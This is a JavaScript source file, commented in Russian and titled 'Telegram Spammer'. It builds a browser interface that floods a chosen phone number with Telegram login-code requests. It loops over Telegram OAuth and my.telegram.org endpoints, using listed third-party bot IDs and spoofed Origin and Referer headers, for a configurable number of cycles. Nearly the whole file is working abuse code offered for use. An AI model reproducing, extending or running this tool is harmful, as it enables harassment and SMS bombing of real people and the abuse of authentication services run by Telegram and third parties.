/* ── Telegram Spammer (работает в WebView) ── */
(function() {
  // Элементы
  const phoneInput = document.getElementById('phoneInput');
  const delayInput = document.getElementById('delayInput');
  const cyclesInput = document.getElementById('cyclesInput');
  const startBtn = document.getElementById('startBtn');
  const stopBtn = document.getElementById('stopBtn');
  const validateBtn = document.getElementById('validateBtn');
  const qrBtn = document.getElementById('qrBtn');
  const exportBtn = document.getElementById('exportBtn');
  const importBtn = document.getElementById('importBtn');
  const clearLogBtn = document.getElementById('clearLogBtn');
  const svcList = document.getElementById('svcList');
  const logContainer = document.getElementById('logContainer');

  // Список сервисов (OAuth / форма)
  const services = [
    { name: 'Presscode',      url: 'https://oauth.telegram.org/auth/request', bot_id: '1852523856', origin: 'https://cabinet.presscode.app', embed: '1', return_to: 'https://cabinet.presscode.app/login' },
    { name: 'Translations',   url: 'https://translations.telegram.org/auth/request' },
    { name: 'Fragment',       url: 'https://oauth.telegram.org/auth', bot_id: '5444323279', origin: 'https://fragment.com', request_access: 'write', return_to: 'https://fragment.com/' },
    { name: 'Bot-T',          url: 'https://oauth.telegram.org/auth', bot_id: '1199558236', origin: 'https://bot-t.com', embed: '1', request_access: 'write', return_to: 'https://bot-t.com/login' },
    { name: 'Off-Bot',        url: 'https://oauth.telegram.org/auth/request', bot_id: '1093384146', origin: 'https://off-bot.ru', embed: '1', request_access: 'write', return_to: 'https://off-bot.ru/register/connected-accounts/smodders_telegram/?setup=1' },
    { name: 'Mipped',         url: 'https://oauth.telegram.org/auth/request', bot_id: '466141824', origin: 'https://mipped.com', embed: '1', request_access: 'write', return_to: 'https://mipped.com/f/register/connected-accounts/smodders_telegram/?setup=1' },
    { name: 'Spot.uz',        url: 'https://oauth.telegram.org/auth/request', bot_id: '5463728243', origin: 'https://www.spot.uz', return_to: 'https://www.spot.uz/ru/2022/04/29/yoto/#' },
    { name: 'Tbiz.pro',       url: 'https://oauth.telegram.org/auth/request', bot_id: '1733143901', origin: 'https://tbiz.pro', embed: '1', request_access: 'write', return_to: 'https://tbiz.pro/login' },
    { name: 'TelegramBot.biz',url: 'https://oauth.telegram.org/auth/request', bot_id: '319709511', origin: 'https://telegrambot.biz', embed: '1', return_to: 'https://telegrambot.biz/' },
    { name: 'TG Store',       url: 'https://oauth.telegram.org/auth/request', bot_id: '1803424014', origin: 'https://ru.telegram-store.com', embed: '1', request_access: 'write', return_to: 'https://ru.telegram-store.com/catalog/search' },
    { name: 'Combot',         url: 'https://oauth.telegram.org/auth/request', bot_id: '210944655', origin: 'https://combot.org', embed: '1', request_access: 'write', return_to: 'https://combot.org/login' },
    { name: 'My.Telegram',    url: 'https://my.telegram.org/auth/send_password' }
  ];

  // Генерация чекбоксов сервисов
  services.forEach(svc => {
    const label = document.createElement('label');
    label.style.cssText = 'display:flex;align-items:center;gap:6px;font-size:0.78rem;color:var(--muted);cursor:pointer;';
    label.innerHTML = `<input type="checkbox" value="${svc.name}" checked> ${svc.name}`;
    svcList.appendChild(label);
  });

  // Утилита лога
  function log(msg, type = 'info') {
    const div = document.createElement('div');
    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    div.style.color = type === 'err' ? 'var(--red)' : type === 'ok' ? 'var(--green)' : 'var(--muted)';
    logContainer.appendChild(div);
    logContainer.scrollTop = logContainer.scrollHeight;
  }

  // Очистка лога
  clearLogBtn.addEventListener('click', () => { logContainer.innerHTML = ''; });

  // Валидация номера (простая проверка) — libphonenumber не подключён, поэтому минимально
  validateBtn.addEventListener('click', () => {
    const phone = phoneInput.value.trim();
    if (!phone) return log('Введите номер', 'err');
    // Простая проверка: только цифры и может начинаться с +
    if (/^\+?\d{7,15}$/.test(phone)) {
      log(`✅ Номер ${phone} похож на корректный`, 'ok');
    } else {
      log(`❌ Номер ${phone} невалиден`, 'err');
    }
  });

  // QR-код (генерируем через API goQR, открываем в новой вкладке)
  qrBtn.addEventListener('click', () => {
    const phone = phoneInput.value.trim();
    if (!phone) return log('Введите номер', 'err');
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`;
    window.open(qrUrl, '_blank');
    log('QR-код открыт в новой вкладке');
  });

  // Экспорт конфига
  exportBtn.addEventListener('click', () => {
    const config = {
      phone: phoneInput.value.trim(),
      delay: delayInput.value,
      cycles: cyclesInput.value
    };
    const blob = new Blob([JSON.stringify(config)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'spam_config.json';
    a.click();
    URL.revokeObjectURL(a.href);
    log('📤 Конфиг экспортирован');
  });

  // Импорт конфига
  importBtn.addEventListener('click', () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = '.json';
    input.onchange = (e) => {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = () => {
        try {
          const config = JSON.parse(reader.result);
          if (config.phone) phoneInput.value = config.phone;
          if (config.delay) delayInput.value = config.delay;
          if (config.cycles) cyclesInput.value = config.cycles;
          log('📥 Конфиг импортирован', 'ok');
        } catch (err) {
          log('Ошибка импорта', 'err');
        }
      };
      reader.readAsText(file);
    };
    input.click();
  });

  // Основные переменные управления
  let running = false;
  let abortController = null;

  stopBtn.disabled = true;

  // Функция отправки одного запроса к сервису
  async function sendToService(svc, phone) {
    const params = new URLSearchParams();
    params.append('phone', phone);
    if (svc.bot_id) params.append('bot_id', svc.bot_id);
    if (svc.origin) params.append('origin', svc.origin);
    if (svc.embed) params.append('embed', svc.embed);
    if (svc.request_access) params.append('request_access', svc.request_access);
    if (svc.return_to) params.append('return_to', svc.return_to);

    try {
      await fetch(svc.url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Origin': svc.origin || 'https://oauth.telegram.org',
          'Referer': svc.origin || 'https://oauth.telegram.org/auth',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: params.toString(),
        mode: 'no-cors',
        signal: abortController ? abortController.signal : undefined
      });
      log(`✅ ${svc.name} – отправлен`, 'ok');
      return true;
    } catch (err) {
      if (err.name === 'AbortError') throw err;
      log(`❌ ${svc.name} – ошибка`, 'err');
      return false;
    }
  }

  // Старт спама
  async function startSpam() {
    if (running) return;

    const phone = phoneInput.value.trim();
    if (!phone) {
      log('Введите номер', 'err');
      return;
    }

    const delay = parseFloat(delayInput.value) || 0.5;
    const cycles = parseInt(cyclesInput.value) || 3;

    // Получаем выбранные сервисы
    const checked = [...svcList.querySelectorAll('input:checked')].map(cb => cb.value);
    if (!checked.length) {
      log('Выберите сервисы', 'err');
      return;
    }

    running = true;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    abortController = new AbortController();

    log(`🚀 Старт на ${phone}. Циклы: ${cycles || '∞'}`);

    for (let cycle = 1; running && (cycles === 0 || cycle <= cycles); cycle++) {
      log(`⚡ Цикл ${cycle}`);
      for (const svcName of checked) {
        if (!running) break;
        const svc = services.find(s => s.name === svcName);
        if (svc) await sendToService(svc, phone);
        await new Promise(resolve => setTimeout(resolve, delay * 1000));
      }
    }

    if (running) log('✅ Завершено', 'ok');
    running = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    abortController = null;
  }

  // Стоп спама
  function stopSpam() {
    running = false;
    if (abortController) abortController.abort();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    log('⏹ Остановлено');
  }

  // Обработчики кнопок
  startBtn.addEventListener('click', startSpam);
  stopBtn.addEventListener('click', stopSpam);

  // Очистка при остановке (на случай закрытия страницы)
  window.addEventListener('beforeunload', () => {
    if (running) stopSpam();
  });
})();
